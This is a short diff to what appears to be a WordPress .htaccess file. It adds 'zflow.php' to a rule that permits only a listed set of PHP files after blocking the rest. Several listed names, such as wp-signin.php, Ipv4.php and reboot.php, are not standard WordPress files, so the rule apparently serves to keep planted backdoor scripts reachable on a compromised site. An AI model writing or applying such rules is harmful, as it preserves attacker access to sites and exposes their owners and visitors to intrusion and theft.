@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|wp-login.php|users.php|wp-signin.php|wp-blog-header.php|wp-config.php|wp-cron.php|wp-load.php|wp-activate.php|class-wp-blog-format.php|Ipv4.php|class-walker.php|reboot.php|about.php)$">
+<FilesMatch "^(index.php|wp-login.php|users.php|wp-signin.php|wp-blog-header.php|wp-config.php|wp-cron.php|wp-load.php|wp-activate.php|class-wp-blog-format.php|Ipv4.php|class-walker.php|reboot.php|about.php|zflow.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
